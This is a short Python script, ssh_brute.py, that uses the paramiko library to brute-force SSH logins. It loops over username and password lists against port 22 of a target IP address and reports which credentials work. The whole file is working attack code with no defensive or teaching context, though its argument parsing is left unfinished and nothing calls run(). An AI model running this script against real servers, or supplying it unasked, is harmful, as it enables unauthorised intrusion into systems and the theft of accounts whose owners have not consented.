#! /usr/bin/python3
# ssh_brute.py

import argparse
import paramiko

def run(args):
    ip_address = args.ip_address
    usernames = args.usernames.split(',')
    passwords = args.passwords.split(',')

    for username in usernames:
        for password in passwords:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(ip_address, port=22, username=username, password=password)
                print(f'Login successful - Username: {username} Password: {password}')
                ssh.close()
                return
            except paramiko.AuthenticationException:
                print(f'Authentication failed - Username: {username} Password: {password}')
            except Exception as e:
                print(f'Error connecting to {ip_address}: {e}')
                ssh.close()
                return
    print(f'Could not find valid credentials for {ip_address}')
